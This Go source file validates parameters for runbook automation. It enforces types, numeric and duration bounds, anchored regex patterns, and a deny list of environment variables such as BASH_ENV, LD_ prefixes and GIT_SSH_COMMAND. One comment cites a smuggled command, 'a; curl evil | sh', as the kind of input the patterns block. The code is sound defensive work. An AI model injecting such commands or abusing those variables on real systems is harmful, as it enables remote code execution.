package runbook

import (
	"fmt"
	"math"
	"regexp"
	"strconv"
	"strings"
	"time"

	"github.com/peacedouts/nightfix/internal/expr"
)

// ResolveParams computes a run's parameters: supplied values first, then
// `from` expressions over the trigger context, then defaults. Every value is
// type-checked and validated against pattern / enum / min / max.
func ResolveParams(rb *Runbook, supplied map[string]any, ctx expr.Vars) (map[string]any, error) {
	out := map[string]any{}
	for _, name := range sortedKeys(rb.Spec.Parameters) {
		p := rb.Spec.Parameters[name]
		var (
			v     any
			found bool
		)
		if sv, ok := supplied[name]; ok {
			v, found = sv, true
		} else if p.From != "" {
			fv, err := expr.Eval(p.From, ctx)
			if err == nil && fv != nil {
				v, found = fv, true
			}
		}
		if !found && p.Default != nil {
			v, found = p.Default, true
		}
		if !found {
			if p.Required {
				return nil, fmt.Errorf("parameter %q is required", name)
			}
			continue
		}
		cv, err := coerceParam(name, p, v)
		if err != nil {
			return nil, err
		}
		out[name] = cv
	}
	for k := range supplied {
		if _, ok := rb.Spec.Parameters[k]; !ok {
			return nil, fmt.Errorf("unknown parameter %q", k)
		}
	}
	return out, nil
}

// ValidateParams re-checks already-resolved parameters. The agent calls this
// as defense in depth against a buggy or compromised control plane.
func ValidateParams(rb *Runbook, params map[string]any) error {
	for k, v := range params {
		p, ok := rb.Spec.Parameters[k]
		if !ok {
			return fmt.Errorf("unknown parameter %q", k)
		}
		if _, err := coerceParam(k, p, v); err != nil {
			return err
		}
	}
	for _, name := range sortedKeys(rb.Spec.Parameters) {
		if rb.Spec.Parameters[name].Required {
			if _, ok := params[name]; !ok {
				return fmt.Errorf("parameter %q is required", name)
			}
		}
	}
	return nil
}

// MaxSafeInt bounds int parameters. Parameters travel as JSON numbers (the
// run record, the signed envelope), which carry integers exactly only up to
// 2^53; past that a value would silently change on the way to the agent.
const MaxSafeInt = 1<<53 - 1

func coerceParam(name string, p Param, v any) (any, error) {
	bad := func(format string, args ...any) (any, error) {
		return nil, fmt.Errorf("parameter %q: "+format, append([]any{name}, args...)...)
	}
	matches := func(s string) error {
		if p.Pattern == "" {
			return nil
		}
		re, err := CompilePattern(p.Pattern)
		if err != nil {
			_, err := bad("invalid pattern")
			return err
		}
		if !re.MatchString(s) {
			_, err := bad("value %q does not match %s", s, p.Pattern)
			return err
		}
		return nil
	}
	switch p.Type {
	case "string":
		s, ok := v.(string)
		if !ok {
			return bad("want string, got %T", v)
		}
		if len(s) > 1024 {
			return bad("value too long")
		}
		if err := matches(s); err != nil {
			return nil, err
		}
		return s, nil
	case "enum":
		for _, allowed := range p.Values {
			if fmt.Sprint(allowed) == fmt.Sprint(v) {
				return allowed, nil
			}
		}
		return bad("value %v is not one of %v", v, p.Values)
	case "int":
		var n int64
		switch x := v.(type) {
		case int64:
			n = x
		case int:
			n = int64(x)
		case float64:
			// NaN, ±Inf and whole floats past int64 have no int64 value:
			// the conversion is undefined (MinInt64 on amd64).
			if math.IsNaN(x) || math.IsInf(x, 0) || x != math.Trunc(x) {
				return bad("want integer, got %v", x)
			}
			if math.Abs(x) > MaxSafeInt {
				return bad("integer %v is out of range (±%d)", x, int64(MaxSafeInt))
			}
			n = int64(x)
		case string:
			i, err := strconv.ParseInt(x, 10, 64)
			if err != nil {
				return bad("want integer, got %q", x)
			}
			n = i
		default:
			return bad("want integer, got %T", v)
		}
		if n > MaxSafeInt || n < -MaxSafeInt {
			return bad("integer %d is out of range (±%d)", n, int64(MaxSafeInt))
		}
		// |n| <= 2^53, so float64(n) is exact. A bound that isn't a number
		// fails closed rather than reading as 0.
		if p.Min != nil {
			lo, ok := toFloat(p.Min)
			if !ok {
				return bad("invalid minimum %v", p.Min)
			}
			if float64(n) < lo {
				return bad("below minimum %v", p.Min)
			}
		}
		if p.Max != nil {
			hi, ok := toFloat(p.Max)
			if !ok {
				return bad("invalid maximum %v", p.Max)
			}
			if float64(n) > hi {
				return bad("above maximum %v", p.Max)
			}
		}
		return n, nil
	case "bool":
		switch x := v.(type) {
		case bool:
			return x, nil
		case string:
			b, err := strconv.ParseBool(x)
			if err != nil {
				return bad("want bool, got %q", x)
			}
			return b, nil
		}
		return bad("want bool, got %T", v)
	case "duration":
		s, ok := v.(string)
		if !ok {
			return bad("want duration string, got %T", v)
		}
		d, err := time.ParseDuration(s)
		if err != nil {
			return bad("invalid duration %q", s)
		}
		// Lint requires a pattern on `from` durations, so it must apply.
		if err := matches(s); err != nil {
			return nil, err
		}
		if p.Min != nil {
			lo, ok := toDuration(p.Min)
			if !ok {
				return bad("invalid minimum %v", p.Min)
			}
			if d < lo {
				return bad("below minimum %v", p.Min)
			}
		}
		if p.Max != nil {
			hi, ok := toDuration(p.Max)
			if !ok {
				return bad("invalid maximum %v", p.Max)
			}
			if d > hi {
				return bad("above maximum %v", p.Max)
			}
		}
		return s, nil
	}
	return bad("unknown type %q", p.Type)
}

// toFloat reads an int bound: a number, or a string holding one.
func toFloat(v any) (float64, bool) {
	var f float64
	switch x := v.(type) {
	case float64:
		f = x
	case int64:
		f = float64(x)
	case int:
		f = float64(x)
	case string:
		var err error
		if f, err = strconv.ParseFloat(x, 64); err != nil {
			return 0, false
		}
	default:
		return 0, false
	}
	if math.IsNaN(f) {
		return 0, false
	}
	return f, true
}

// toDuration reads a duration bound, which must be a duration string ("5m"):
// a bare number has no unit.
func toDuration(v any) (time.Duration, bool) {
	s, ok := v.(string)
	if !ok {
		return 0, false
	}
	d, err := time.ParseDuration(s)
	return d, err == nil
}

// CompilePattern compiles a parameter pattern so it must match the whole
// value. Patterns are a security control on alert-derived input, and a
// substring match ("[a-z]+" matching "a; curl evil | sh") would defeat it.
//
// Every pattern is anchored implicitly, so "[a-z]+" and "^[a-z]+$" mean the
// same thing. The anchors are Go's: without (?m), $ matches only at the very
// end of the value (unlike Perl or Python, not before a trailing newline), so
// "^[a-z]+$" rejects "abc\n" and "abc\ndef". Flags set inside a pattern, such
// as (?m), apply only within the wrapper's group, never to its anchors. A
// pattern lets newlines through only if it matches them itself (\n, \s, (?s).).
func CompilePattern(p string) (*regexp.Regexp, error) {
	// The pattern must stand on its own: "a)|(.*" would otherwise close the
	// wrapper's group and leave an unanchored alternative.
	if _, err := regexp.Compile(p); err != nil {
		return nil, err
	}
	return regexp.Compile(`^(?:` + p + `)$`)
}

// ReservedEnv reports whether an env name may not be set by a runbook: the
// agent's own variables, and names the shell or dynamic loader act on
// (BASH_ENV, for one, is expanded and run before the script itself).
func ReservedEnv(name string) bool {
	switch name {
	case "PATH", "HOME", "TMPDIR", "LANG", "IFS", "ENV", "SHELLOPTS", "BASHOPTS", "PS4", "PROMPT_COMMAND",
		"CDPATH", "GLOBIGNORE", "POSIXLY_CORRECT", "PYTHONPATH", "PYTHONSTARTUP", "PYTHONHOME", "PYTHONUSERBASE", "PYTHONEXECUTABLE", "PERL5LIB", "PERL5OPT",
		"PERLLIB", "RUBYOPT", "RUBYLIB", "NODE_OPTIONS", "GCONV_PATH", "JAVA_TOOL_OPTIONS", "_JAVA_OPTIONS", "JDK_JAVA_OPTIONS",
		"LESSOPEN", "LESSCLOSE", "PAGER", "EDITOR", "VISUAL", "SSH_ASKPASS", "SUDO_ASKPASS", "GIT_ASKPASS", "GIT_SSH", "GIT_SSH_COMMAND",
		"GIT_EXEC_PATH", "GIT_PAGER", "GIT_EDITOR", "GIT_PROXY_COMMAND", "AWS_CONFIG_FILE", "AWS_SHARED_CREDENTIALS_FILE":
		return true
	}
	for _, prefix := range []string{"BASH_", "LD_", "DYLD_", "GIT_CONFIG"} {
		if strings.HasPrefix(name, prefix) {
			return true
		}
	}
	return false
}
